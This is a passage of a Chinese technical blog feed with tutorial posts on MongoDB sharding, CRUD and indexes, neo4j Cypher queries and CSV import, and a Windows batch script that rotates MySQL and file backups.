    <title>MongoDB 分片</title>
    <url>/blog/nosql/mongodb/shard/</url>
    <content><![CDATA[<p>在Mongodb里面存在另一种集群，就是分片技术,可以满足MongoDB数据量大量增长的需求。</p>
<p>当MongoDB存储海量的数据时，一台机器可能不足以存储数据也足以提供可接受的读写吞吐量。这时，我们就可以通过在多台机器上分割数据，使得数据库系统能存储和处理更多的数据。</p>
<p>为什么使用分片</p>
<ul>
<li>复制所有的写入操作到主节点</li>
<li>延迟的敏感数据会在主节点查询</li>
<li>单个副本集限制在12个节点</li>
<li>当请求量巨大时会出现内存不足。</li>
<li>本地磁盘不足</li>
<li>垂直扩展价格昂贵</li>
</ul>
<p>下图展示了在MongoDB中使用分片集群结构分布：</p>
<p><img src="/images/mongodb/sharding.png"></p>
<p>上图中主要有如下所述三个主要组件：</p>
<ul>
<li><p><strong>Shard:</strong></p>
<p>用于存储实际的数据块，实际生产环境中一个shard<br>server角色可由几台机器组个一个relica set承担，防止主机单点故障</p>
</li>
<li><p><strong>Config Server:</strong></p>
<p>mongod实例，存储了整个 ClusterMetadata，其中包括 chunk信息。</p>
</li>
<li><p><strong>Query Routers:</strong></p>
<p>前端路由，客户端由此接入，且让整个集群看上去像单一数据库，前端应用可以透明使用。</p>
</li>
</ul>
<h2 id="启动服务器"><a href="#启动服务器" class="headerlink" title="启动服务器"></a>启动服务器</h2><p>首先要启动配制服务器和mongos</p>
<p><strong>启动config服务器</strong></p>
<pre><code>./mongod --dbpath ~/dbs/config --port 20000
</code></pre>
<p><strong>启动mongos</strong></p>
<p>mongos不需要数据目录，但要指定配制服务器地址。</p>
<pre><code>./mongos --port 30000 --configdb localhost:20000
</code></pre>
<p>分片处理通过mongos完成。</p>
<p><strong>添加片服务器</strong></p>
<pre><code>./mongod --dbpath ~/dbs/shard1 --port 40000
./mongod --dbpath ~/dbs/shard1 --port 50000
</code></pre>
<p><strong>添加分片</strong></p>
<p>连接上mongos</p>
<pre><code>./mongo localhost:30000
</code></pre>
<p>用addshard添加分片</p>
<pre><code>sh.addShard(&quot;localhost:40000&quot;)
sh.addShard(&quot;localhost:50000&quot;)
</code></pre>
<p>addShard参数可以是：</p>
<pre><code>[hostname]
[hostname]:[port]
[replica-set-name]/[hostname]
[replica-set-name]/[hostname]:port
</code></pre>
<h2 id="设置分片"><a href="#设置分片" class="headerlink" title="设置分片"></a>设置分片</h2><p>片已经集群了，但是mongos不知道该如何切分数据，也就是我们先前所说的片键，在mongodb中设置片键要做两步</p>
<p>开启数据库分片功能，命令很简单 enablesharding(),这里我就开启test数据库。</p>
<p>指定集合中分片的片键，这里我就指定为person.name字段。</p>
<pre><code>sh.enableSharding(&quot;test&quot;)
shshardCollection(&quot;test.person&quot;,&#123;&quot;name&quot;:1&#125;)
</code></pre>
<p>好了，至此我们的分片操作全部结束，接下来我们通过mongos向mongodb插入10w记录，然后通过printShardingStatus命令查看mongodb的数据分片情况。</p>
<pre><code>mongos&gt; for(var i=0;i&lt;100000;i++)&#123; db.person.insert(&#123;&quot;name&quot;:&quot;jack&quot;+i,&quot;age&quot;:i&#125;);&#125;
</code></pre>
<p>连接config服务器查看分片情况：</p>
<pre><code>mongo localhost:20000
MongoDB shell version: 3.2.4
connecting to: localhost:20000/test
&gt; db.printShardingStatus()
--- Sharding Status ---
  sharding version: &#123;
        &quot;_id&quot; : 1,
        &quot;minCompatibleVersion&quot; : 5,
        &quot;currentVersion&quot; : 6,
        &quot;clusterId&quot; : ObjectId(&quot;571353399c909c0a94401956&quot;)
&#125;
  shards:
        &#123;  &quot;_id&quot; : &quot;shard0000&quot;,  &quot;host&quot; : &quot;localhost:8001&quot; &#125;
        &#123;  &quot;_id&quot; : &quot;shard0001&quot;,  &quot;host&quot; : &quot;localhost:8002&quot; &#125;
  active mongoses:
        &quot;3.2.4&quot; : 1
  balancer:
        Currently enabled:  yes
        Currently running:  no
        Failed balancer rounds in last 5 attempts:  0
        Migration Results for the last 24 hours:
                1 : Success
  databases:
        &#123;  &quot;_id&quot; : &quot;test&quot;,  &quot;primary&quot; : &quot;shard0000&quot;,  &quot;partitioned&quot; : true &#125;
                test.person
                        shard key: &#123; &quot;name&quot; : 1 &#125;
                        unique: false
                        balancing: true
                        chunks:
                                shard0000       2
                                shard0001       1
                        &#123; &quot;name&quot; : &#123; &quot;$minKey&quot; : 1 &#125; &#125; --&gt;&gt; &#123; &quot;name&quot; : &quot;jack1&quot; &#125; on : shard0001 Timestamp(2, 0)
                        &#123; &quot;name&quot; : &quot;jack1&quot; &#125; --&gt;&gt; &#123; &quot;name&quot; : &quot;jack6&quot; &#125; on : shard0000 Timestamp(2, 1)
                        &#123; &quot;name&quot; : &quot;jack6&quot; &#125; --&gt;&gt; &#123; &quot;name&quot; : &#123; &quot;$maxKey&quot; : 1 &#125; &#125; on : shard0000 Timestamp(1, 3)

&gt;
</code></pre>
]]></content>
      <categories>
        <category>nosql</category>
        <category>MongoDB</category>
      </categories>
      <tags>
        <tag>nosql</tag>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title>MongoDB 文档的增删改查</title>
    <url>/blog/nosql/mongodb/zsgc/</url>
    <content><![CDATA[<h2 id="插入文档"><a href="#插入文档" class="headerlink" title="插入文档"></a>插入文档</h2><p>MongoDB 使用 insert() 或 save() 方法向集合中插入文档，语法如下：</p>
<pre><code>db.COLLECTION_NAME.insert(document)
</code></pre>
<p>插入文档你也可以使用 db.col.save(document) 命令。如果不指定 _id 字段save() 方法类似于insert() 方法。如果指定 _id 字段，则会更新该 _id的数据。</p>
<p>示例：</p>
<pre><code>&gt;db.col.insert(&#123;title: &#39;MongoDB 教程&#39;, 
    description: &#39;MongoDB 是一个 Nosql 数据库&#39;,
    url: &#39;http://www.iteedu.com&#39;,
    tags: [&#39;mongodb&#39;, &#39;database&#39;, &#39;NoSQL&#39;],
    likes: 100
&#125;)
</code></pre>
<p>我们也可以将数据定义为一个变量再插入，如下所示：</p>
<pre><code>&gt; document=(&#123;title: &#39;MongoDB 教程&#39;, 
    description: &#39;MongoDB 是一个 Nosql 数据库&#39;,
    url: &#39;http://www.iteedu.com&#39;,
    tags: [&#39;mongodb&#39;, &#39;database&#39;, &#39;NoSQL&#39;],
    likes: 100
&#125;);
&gt; db.col.insert(document)
WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)
&gt; 
</code></pre>
<h2 id="更新文档"><a href="#更新文档" class="headerlink" title="更新文档"></a>更新文档</h2><p>update() 方法用于更新已存在的文档。语法格式如下：</p>
<pre><code>db.collection.update(
   &lt; query&gt;,
   &lt; update&gt;,
   &#123;
     upsert: &lt; boolean&gt;,
     multi: &lt; boolean&gt;,
     writeConcern: &lt; document&gt;
   &#125;
)
</code></pre>
<p><strong>参数说明：</strong></p>
<ul>
<li><strong>query</strong> : update的查询条件，类似sql update查询内where后面的。</li>
<li><strong>update</strong> :update的对象和一些更新的操作符（如$,$inc…）等，也可以理解为sql update查询内set后面的</li>
<li><strong>upsert</strong> : 可选，这个参数的意思是，如果不存在update的记录，是否插入objNew,true为插入，默认是false，不插入。</li>
<li><strong>multi</strong> : 可选，mongodb 默认是false,只更新找到的第一条记录，如果这个参数为true,就把按条件查出来多条记录全部更新。</li>
<li><strong>writeConcern</strong> :可选，抛出异常的级别。</li>
</ul>
<p>示例</p>
<pre><code>&gt;db.col.update(&#123;&#39;title&#39;:&#39;MongoDB 教程&#39;&#125;,&#123;$set:&#123;&#39;title&#39;:&#39;MongoDB&#39;&#125;&#125;)
WriteResult(&#123; &quot;nMatched&quot; : 1, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 1 &#125;)   # 输出信息
</code></pre>
<p>以上语句只会修改第一条发现的文档，如果你要修改多条相同的文档，则需要设置multi 参数为 true。</p>
<pre><code>&gt;db.col.update(&#123;&#39;title&#39;:&#39;MongoDB 教程&#39;&#125;,&#123;$set:&#123;&#39;title&#39;:&#39;MongoDB&#39;&#125;&#125;,&#123;multi:true&#125;)
</code></pre>
<h2 id="save-方法"><a href="#save-方法" class="headerlink" title="save() 方法"></a>save() 方法</h2><p>save() 方法通过传入的文档来替换已有文档。语法格式如下：</p>
<pre><code>db.collection.save(
   &lt; document&gt;,
   &#123;
     writeConcern: &lt; document&gt;
   &#125;
)
</code></pre>
<p><strong>参数说明：</strong></p>
<ul>
<li><strong>document</strong> : 文档数据。</li>
<li><strong>writeConcern</strong> :可选，抛出异常的级别。</li>
</ul>
<h2 id="删除文档"><a href="#删除文档" class="headerlink" title="删除文档"></a>删除文档</h2><p>remove() 方法的基本语法格式如下所示：</p>
<pre><code>db.collection.remove(
   &lt; query&gt;,
   &#123;
     justOne: &lt; boolean&gt;,
     writeConcern: &lt; document&gt;
   &#125;
)
</code></pre>
<p><strong>参数说明：</strong></p>
<ul>
<li><strong>query</strong> :（可选）删除的文档的条件。</li>
<li><strong>justOne</strong> : （可选）如果设为 true 或 1，则只删除一个文档。</li>
<li><strong>writeConcern</strong> :（可选）抛出异常的级别。</li>
</ul>
<p>示例</p>
<pre><code>&gt;db.col.remove(&#123;&#39;title&#39;:&#39;MongoDB 教程&#39;&#125;)
WriteResult(&#123; &quot;nRemoved&quot; : 2 &#125;)           # 删除了两条数据
&gt;db.col.find()
……                                        # 没有数据
</code></pre>
<p>如果你想删除所有数据，可以使用以下方式（类似常规 SQL 的 truncate命令）：</p>
<pre><code>&gt;db.col.remove(&#123;&#125;)
</code></pre>
<h2 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h2><p>MongoDB 查询数据的语法格式如下：</p>
<pre><code>&gt;db.COLLECTION_NAME.find()
</code></pre>
<p>find()方法以非结构化的方式来显示所有文档。如果你需要以易读的方式来读取数据，可以使用pretty() 方法，语法格式如下：</p>
<pre><code>&gt;db.col.find().pretty()
</code></pre>
<p>除了 find() 方法之外，还有一个 findOne() 方法，它只返回一个文档。</p>
<p>MongoDB 的 find() 方法可以传入多个键(key)，每个键(key)以逗号隔开，及常规SQL 的 AND 条件。语法格式如下：</p>
<pre><code>&gt;db.col.find(&#123;key1:value1, key2:value2&#125;).pretty()
</code></pre>
<p>MongoDB OR 条件语句使用了关键字 $or,语法格式如下：</p>
<pre><code>&gt;db.col.find(
   &#123;
      $or: [
         &#123;key1: value1&#125;, &#123;key2:value2&#125;
      ]
   &#125;
).pretty()
</code></pre>
<p>以下实例演示了 AND 和 OR 联合使用</p>
<pre><code>&gt;db.col.find(&#123;&quot;likes&quot;: &#123;$gt:50&#125;, $or: [&#123;&quot;url&quot;: &quot;http://www.iteedu.com&quot;&#125;,&#123;&quot;title&quot;: &quot;MongoDB 教程&quot;&#125;]&#125;).pretty()
</code></pre>
<h2 id="条件操作符"><a href="#条件操作符" class="headerlink" title="条件操作符"></a>条件操作符</h2><p>条件操作符用于比较两个表达式并从mongoDB集合中获取数据。</p>
<p>MongoDB中条件操作符有：</p>
<ul>
<li>(&gt;) 大于 - $gt</li>
<li>(&lt;) 小于 - $lt</li>
<li>(&gt;&#x3D;) 大于等于 - $gte</li>
<li>(&lt;&#x3D; ) 小于等于 - $lte</li>
</ul>
<p><strong>MongoDB (&gt;) 大于操作符 - $gt</strong></p>
<p>如果你想获取 “col” 集合中 “likes” 大于 100 的数据，你可以使用以下命令：</p>
<pre><code>db.col.find(&#123;&quot;likes&quot; : &#123;$gt : 100&#125;&#125;)
</code></pre>
<p>类似于SQL语句：</p>
<pre><code>Select * from col where likes &gt; 100;
</code></pre>
<p><strong>MongoDB（&gt;&#x3D;）大于等于操作符 - $gte</strong></p>
<p>如果你想获取”col”集合中 “likes” 大于等于 100的数据，你可以使用以下命令：</p>
<pre><code>db.col.find(&#123;likes : &#123;$gte : 100&#125;&#125;)
</code></pre>
<p>类似于SQL语句：</p>
<pre><code>Select * from col where likes &gt;=100;
</code></pre>
<p><strong>MongoDB (&lt;) 小于操作符 - $lt</strong></p>
<p>如果你想获取”col”集合中 “likes” 小于 150 的数据，你可以使用以下命令：</p>
<pre><code>db.col.find(&#123;likes : &#123;$lt : 150&#125;&#125;)
</code></pre>
<p>类似于SQL语句：</p>
<pre><code>Select * from col where likes &lt; 150;
</code></pre>
<p><strong>MongoDB (&lt;&#x3D;) 小于操作符 - $lte</strong></p>
<p>如果你想获取”col”集合中 “likes” 小于等于 150的数据，你可以使用以下命令：</p>
<pre><code>db.col.find(&#123;likes : &#123;$lte : 150&#125;&#125;)
</code></pre>
<p>类似于SQL语句：</p>
<pre><code>Select * from col where likes &lt;= 150;
</code></pre>
<p><strong>MongoDB 使用 (&lt;) 和 (&gt;) 查询 - $lt 和 $gt</strong></p>
<p>如果你想获取”col”集合中 “likes” 大于100，小于 200的数据，你可以使用以下命令：</p>
<pre><code>db.col.find(&#123;likes : &#123;$lt :200, $gt : 100&#125;&#125;)
</code></pre>
<p>类似于SQL语句：</p>
<pre><code>Select * from col where likes&gt;100 AND  likes&lt;200;
</code></pre>
<h2 id="type-操作符"><a href="#type-操作符" class="headerlink" title="$type 操作符"></a>$type 操作符</h2><p>$type操作符是基于BSON类型来检索集合中匹配的数据类型，并返回结果。</p>
<p>MongoDB 中可以使用的类型如下表所示：</p>
<table>
<thead>
<tr>
<th><strong>类型</strong></th>
<th><strong>数字</strong></th>
<th><strong>备注</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Double</td>
<td>1</td>
<td>?</td>
</tr>
<tr>
<td>String</td>
<td>2</td>
<td>?</td>
</tr>
<tr>
<td>Object</td>
<td>3</td>
<td>?</td>
</tr>
<tr>
<td>Array</td>
<td>4</td>
<td>?</td>
</tr>
<tr>
<td>Binary data</td>
<td>5</td>
<td>?</td>
</tr>
<tr>
<td>Undefined</td>
<td>6</td>
<td>已废弃。</td>
</tr>
<tr>
<td>Object id</td>
<td>7</td>
<td>?</td>
</tr>
<tr>
<td>Boolean</td>
<td>8</td>
<td>?</td>
</tr>
<tr>
<td>Date</td>
<td>9</td>
<td>?</td>
</tr>
<tr>
<td>Null</td>
<td>10</td>
<td>?</td>
</tr>
<tr>
<td>Regular Expression</td>
<td>11</td>
<td>?</td>
</tr>
<tr>
<td>JavaScript</td>
<td>13</td>
<td>?</td>
</tr>
<tr>
<td>Symbol</td>
<td>14</td>
<td>?</td>
</tr>
<tr>
<td>JavaScript (with scope)</td>
<td>15</td>
<td>?</td>
</tr>
<tr>
<td>32-bit integer</td>
<td>16</td>
<td>?</td>
</tr>
<tr>
<td>Timestamp</td>
<td>17</td>
<td>?</td>
</tr>
<tr>
<td>64-bit integer</td>
<td>18</td>
<td>?</td>
</tr>
<tr>
<td>Min key</td>
<td>255</td>
<td>Query with <code>-1</code>.</td>
</tr>
<tr>
<td>Max key</td>
<td>127</td>
<td>?</td>
</tr>
</tbody></table>
<p>示例：</p>
<p>如果想获取 “col” 集合中 title 为 String 的数据，你可以使用以下命令：</p>
<pre><code>db.col.find(&#123;&quot;title&quot; : &#123;$type : 2&#125;&#125;)
</code></pre>
]]></content>
      <categories>
        <category>nosql</category>
        <category>MongoDB</category>
      </categories>
      <tags>
        <tag>nosql</tag>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title>neo4j Cypher基础</title>
    <url>/blog/nosql/neo4j/neo4jbase/</url>
    <content><![CDATA[<h2 id="库结构"><a href="#库结构" class="headerlink" title="库结构"></a>库结构</h2><p>数据库结构</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CALL db.schema()</span><br></pre></td></tr></table></figure>

<p>查询节点标签</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CALL db.labels()</span><br></pre></td></tr></table></figure>

<p>查询关系标签</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CALL db.relationshipTypes()</span><br></pre></td></tr></table></figure>

<p>清空库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MATCH (n) DETACH DELETE n</span><br></pre></td></tr></table></figure>

<h2 id="创建图"><a href="#创建图" class="headerlink" title="创建图"></a>创建图</h2><p>创建一个节点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE (ee:Person &#123; name: &quot;Emil&quot;, from: &quot;Sweden&quot;, klout: 99 &#125;)</span><br></pre></td></tr></table></figure>

<p>创建两个节点和中间的边</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE (le:Person &#123;name: &#x27;Euler&#x27; &#125;),</span><br><span class="line">  (db:Person &#123;name: &#x27;Bernoulli&#x27; &#125;),</span><br><span class="line">  (le)-[:KNOWS &#123;since:1768&#125;]-&gt;(db)</span><br><span class="line">  RETURN le, db</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE (database:Database &#123;name:&quot;Neo4j&quot;&#125;)-[r:SAYS]-&gt;(message:Message &#123;name:&quot;Hello World!&quot;&#125;) RETURN database, message, r</span><br></pre></td></tr></table></figure>

<h2 id="查询图"><a href="#查询图" class="headerlink" title="查询图"></a>查询图</h2><p>查询结点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MATCH (ee:Person) WHERE ee.name = &quot;Emil&quot; RETURN ee;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MATCH (n1)-[r]-&gt;(n2) RETURN r, n1, n2 LIMIT 25</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MATCH (ee:Person)-[:KNOWS]-(friends)</span><br><span class="line">WHERE ee.name = &quot;Emil&quot; RETURN ee, friends</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MATCH (js:Person)-[:KNOWS]-()-[:KNOWS]-(surfer)</span><br><span class="line">WHERE js.name = &quot;Johan&quot; AND surfer.hobby = &quot;surfing&quot;</span><br><span class="line">RETURN DISTINCT surfer</span><br></pre></td></tr></table></figure>

<p>查询数量 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MATCH (n) RETURN count(n)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MATCH ()--&gt;() RETURN count(*);</span><br></pre></td></tr></table></figure>

<h2 id="更新图"><a href="#更新图" class="headerlink" title="更新图"></a>更新图</h2><p>更新数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MATCH (fan:Person)-[w:WATCHED]-&gt;(movie)</span><br><span class="line">WHERE fan.name = &quot;Mikey&quot;</span><br><span class="line">SET w.rating = 5</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">match (p:Person) where p.name=&quot;Euler&quot; set p.name=&quot;douzh&quot;</span><br></pre></td></tr></table></figure>

<h2 id="CSV加载数据"><a href="#CSV加载数据" class="headerlink" title="CSV加载数据"></a>CSV加载数据</h2><p>加载数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LOAD CSV WITH HEADERS FROM &quot;http://data.neo4j.com/northwind/products.csv&quot; AS row</span><br><span class="line">CREATE (n:Product)</span><br><span class="line">SET n = row,</span><br><span class="line">n.unitPrice = toFloat(row.unitPrice),</span><br><span class="line">n.unitsInStock = toInteger(row.unitsInStock), n.unitsOnOrder = toInteger(row.unitsOnOrder),</span><br><span class="line">n.reorderLevel = toInteger(row.reorderLevel), n.discontinued = (row.discontinued &lt;&gt; &quot;0&quot;)</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LOAD CSV WITH HEADERS FROM &quot;http://data.neo4j.com/northwind/categories.csv&quot; AS row</span><br><span class="line">CREATE (n:Category)</span><br><span class="line">SET n = row</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LOAD CSV WITH HEADERS FROM &quot;http://data.neo4j.com/northwind/suppliers.csv&quot; AS row</span><br><span class="line">CREATE (n:Supplier)</span><br><span class="line">SET n = row</span><br></pre></td></tr></table></figure>

<p>创建关系</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MATCH (p:Product),(c:Category)</span><br><span class="line">WHERE p.categoryID = c.categoryID</span><br><span class="line">CREATE (p)-[:PART_OF]-&gt;(c)</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MATCH (p:Product),(c:Category)</span><br><span class="line">WHERE p.categoryID = c.categoryID</span><br><span class="line">CREATE (p)-[:PART_OF]-&gt;(c)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>nosql</category>
      </categories>
      <tags>
        <tag>nosql neo4j</tag>
      </tags>
  </entry>
  <entry>
    <title>neo4j创建三级行业关系</title>
    <url>/blog/nosql/neo4j/neo4jindustry/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE (i:INDUSTRY &#123; code: &quot;C0&quot;, name: &quot;国证行业&quot;&#125;)</span><br></pre></td></tr></table></figure>

<p>一线行业</p>
<table>
<thead>
<tr>
<th>code</th>
<th>name</th>
</tr>
</thead>
<tbody><tr>
<td>C01</td>
<td>能源</td>
</tr>
<tr>
<td>C02</td>
<td>原材料</td>
</tr>
<tr>
<td>C03</td>
<td>工业</td>
</tr>
<tr>
<td>C04</td>
<td>可选消费</td>
</tr>
<tr>
<td>C05</td>
<td>主要消费</td>
</tr>
<tr>
<td>C06</td>
<td>医药卫生</td>
</tr>
<tr>
<td>C07</td>
<td>金融</td>
</tr>
<tr>
<td>C08</td>
<td>信息技术</td>
</tr>
<tr>
<td>C09</td>
<td>电信业务</td>
</tr>
<tr>
<td>C10</td>
<td>公用事业</td>
</tr>
<tr>
<td>C11</td>
<td>房地产</td>
</tr>
</tbody></table>
<p>二级行业</p>
<table>
<thead>
<tr>
<th>code</th>
<th>name</th>
</tr>
</thead>
<tbody><tr>
<td>C0101</td>
<td>能源</td>
</tr>
<tr>
<td>C0201</td>
<td>基础化工</td>
</tr>
<tr>
<td>C0202</td>
<td>基础材料</td>
</tr>
<tr>
<td>C0301</td>
<td>工业品</td>
</tr>
<tr>
<td>C0302</td>
<td>工业服务</td>
</tr>
<tr>
<td>C0303</td>
<td>运输</td>
</tr>
<tr>
<td>C0401</td>
<td>汽车与汽车零配件</td>
</tr>
</tbody></table>
<p>三级行业</p>
<table>
<thead>
<tr>
<th>code</th>
<th>name</th>
</tr>
</thead>
<tbody><tr>
<td>C010101</td>
<td>能源设备与服务</td>
</tr>
<tr>
<td>C010102</td>
<td>石油天然气</td>
</tr>
<tr>
<td>C010103</td>
<td>煤炭</td>
</tr>
<tr>
<td>C010104</td>
<td>可替代能源</td>
</tr>
<tr>
<td>C020101</td>
<td>化学原料</td>
</tr>
<tr>
<td>C020102</td>
<td>化学制品</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LOAD CSV WITH HEADERS FROM &quot;file:///行业一级.csv&quot; AS row</span><br><span class="line">CREATE (n:INDUSTRYL1)</span><br><span class="line">SET n = row</span><br><span class="line"></span><br><span class="line">LOAD CSV WITH HEADERS FROM &quot;file:///行业二级.csv&quot; AS row</span><br><span class="line">CREATE (n:INDUSTRYL2)</span><br><span class="line">SET n = row</span><br><span class="line"></span><br><span class="line">LOAD CSV WITH HEADERS FROM &quot;file:///行业三级.csv&quot; AS row</span><br><span class="line">CREATE (n:INDUSTRYL3)</span><br><span class="line">SET n = row</span><br></pre></td></tr></table></figure>

<p>创建关联关系</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">match (i:INDUSTRY),(i1:INDUSTRYL1)  create(i)-[:subclass]-&gt;(i1)</span><br><span class="line"></span><br><span class="line">match (i1:INDUSTRYL1),(i2:INDUSTRYL2) where i1.code=substring(i2.code,0,3) create(i1)-[:subclass]-&gt;(i2)</span><br><span class="line"></span><br><span class="line">match (i2:INDUSTRYL2),(i3:INDUSTRYL3) where i2.code=substring(i3.code,0,5) create(i2)-[:subclass]-&gt;(i3)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>nosql</category>
      </categories>
      <tags>
        <tag>nosql neo4j</tag>
      </tags>
  </entry>
  <entry>
    <title>【BAT】实记备份数据库和文件的bat脚本</title>
    <url>/blog/os/bat/bakdbfile/</url>
    <content><![CDATA[<p>一个备份网站数据库和附件和bat，记一下要点：</p>
<pre><code>@echo on
:: 设置 mysqldump.exe路径
set dumpcmd=&quot;C:\Program Files (x86)\MySQL\MySQL Server 5.1\bin\mysqldump.exe&quot;
::数据库用户名
set user=
::数据库连接密码
set pwd=
::备份文件目录,保证对应分区是存在的
set bakpath=D:\bak\
::要备份的附件目录
set fjpath=&quot;d:\test&quot;
::----------------开始备份-------------
set &quot;Ymd=%date:~,4%%date:~5,2%%date:~8,2%&quot;
::备份文件名
set bakfile=cms_web_%Ymd%.sql
set fname=%bakpath%%bakfile%
if not exist bakpath mkdir %bakpath%
%dumpcmd% -u %user% -p%pwd% cms_web&gt; %fname%
::只保留最后5个备份
dir /a-d/b %bakpath% | sort /r&gt;%bakpath%zlist.txt
set /a num=0
for /f &quot;usebackq skip=6 delims=&quot;  %%i in (%bakpath%zlist.txt) do del %bakpath%%%i
del %bakpath%zlist.txt
::------------------------备份附件------------------------
::要备份的目录不存在则不备份
if not exist %fjpath% goto end
::备份文件夹名称
set bakfjpath=%bakpath%nw%Ymd%
::已经备份过就不备份了
if exist %bakfjpath% goto end
if not exist bakpath mkdir %bakfjpath%
xcopy %fjpath% %bakfjpath% /e
dir /ad/b %bakpath% | sort /r&gt;%bakpath%zdirlist.txt
set /a num=0
for /f &quot;usebackq skip=5 delims=&quot;  %%i in (%bakpath%zdirlist.txt) do rd /s/q %bakpath%%%i
del %bakpath%zdirlist.txt
: end
pause
</code></pre>
<p>每天备份一次，只保留最近五天的：</p>
<p>实现思路，备份文件按名称排序，跳过前5个，删除以后的。</p>
<p>当然，分析文件名日期删除是最好的，但太麻烦了，所以用了这种简单的方法。</p>
<p>获取文件列表的方法：</p>
<pre><code>dir /a-d/b %bakpath% | sort /r&gt;%bakpath%zlist.txt
</code></pre>
<p>&quot;dir &#x2F;a-d&#x2F;b&quot;分析：</p>
<p>&#x2F;a是输出所有文件目录</p>
<p>-d是减去目录，所以只输出文件了</p>
<p>&#x2F;b的作用是只输出文件名，其它信息不输出</p>
<p>sort &#x2F;r是将文件名排序</p>
<p>&gt;%bakpath%zlist.txt是将结果输出到zlist.txt文件</p>
<p>删除文件分析：</p>
<pre><code>for /f &quot;usebackq skip=6 delims=&quot;  %%i in (%bakpath%zlist.txt) do del %bakpath%%%i
</code></pre>
<p>这行代码的作用是遍历zlist.txt文件，跳过前6行，因为zlist.txt是第一个，还要跳过5个备份文件，所以是6个，删除其余的文件。</p>
<p>附件的删除和这类似，只不过删除命令不同，就不说了。</p>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>BAT脚本</tag>
      </tags>
  </entry>
  <entry>
    <title>MongoDB 索引的使用</title>
    <url>/blog/nosql/mongodb/useindex/</url>
    <content><![CDATA[<p>索引通常能够极大的提高查询的效率，如果没有索引，MongoDB在读取数据时必须扫描集合中的每个文件并选取那些符合查询条件的记录。</p>
<p>索引是特殊的数据结构，索引存储在一个易于遍历读取的数据集合中，索引是对数据库表中一列或多列的值进行排序的一种结构</p>
<h2 id="ensureIndex"><a href="#ensureIndex" class="headerlink" title="ensureIndex()"></a>ensureIndex()</h2><p>MongoDB使用 ensureIndex() 方法来创建索引。</p>
<p>ensureIndex()方法基本语法格式如下所示：</p>
<pre><code>&gt;db.COLLECTION_NAME.ensureIndex(&#123;KEY:1&#125;)
</code></pre>
<p>语法中 Key 值为你要创建的索引字段，1为指定按升序创建索引，如果你想按降序来创建索引指定为-1即可。</p>
<p>示例：</p>
<pre><code>&gt;db.col.ensureIndex(&#123;&quot;title&quot;:1&#125;)
</code></pre>
<p>ensureIndex()方法中你也可以设置使用多个字段创建索引（关系型数据库中称作复合索引）。</p>
<pre><code>&gt;db.col.ensureIndex(&#123;&quot;title&quot;:1,&quot;description&quot;:-1&#125;)
</code></pre>
<p>ensureIndex() 接收可选参数，可选参数列表如下：</p>
<table>
<thead>
<tr>
<th>Parameter</th>
<th>Type</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>background</td>
<td>Boolean</td>
<td>建索引过程会阻塞其它数据库操作，background可指定以后台方式创建索引，即增加 “background” 可选参数。 “background” 默认值为<strong>false</strong>。</td>
</tr>
<tr>
<td>unique</td>
<td>Boolean</td>
<td>建立的索引是否唯一。指定为true创建唯一索引。默认值为<strong>false</strong>.</td>
</tr>
<tr>
<td>name</td>
<td>string</td>
<td>索引的名称。如果未指定，MongoDB的通过连接索引的字段名和排序顺序生成一个索引名称。</td>
</tr>
<tr>
<td>dropDups</td>
<td>Boolean</td>
<td>在建立唯一索引时是否删除重复记录,指定 true 创建唯一索引。默认值为 <strong>false</strong>.</td>
</tr>
<tr>
<td>sparse</td>
<td>Boolean</td>
<td>对文档中不存在的字段数据不启用索引；这个参数需要特别注意，如果设置为true的话，在索引字段中不会查询出不包含对应字段的文档.。默认值为 <strong>false</strong>.</td>
</tr>
<tr>
<td>expireAfterSeconds</td>
<td>integer</td>
<td>指定一个以秒为单位的数值，完成 TTL设定，设定集合的生存时间。</td>
</tr>
<tr>
<td>v</td>
<td>index version</td>
<td>索引的版本号。默认的索引版本取决于mongod创建索引时运行的版本。</td>
</tr>
<tr>
<td>weights</td>
<td>document</td>
<td>索引权重值，数值在 1 到 99,999 之间，表示该索引相对于其他索引字段的得分权重。</td>
</tr>
<tr>
<td>default_language</td>
<td>string</td>
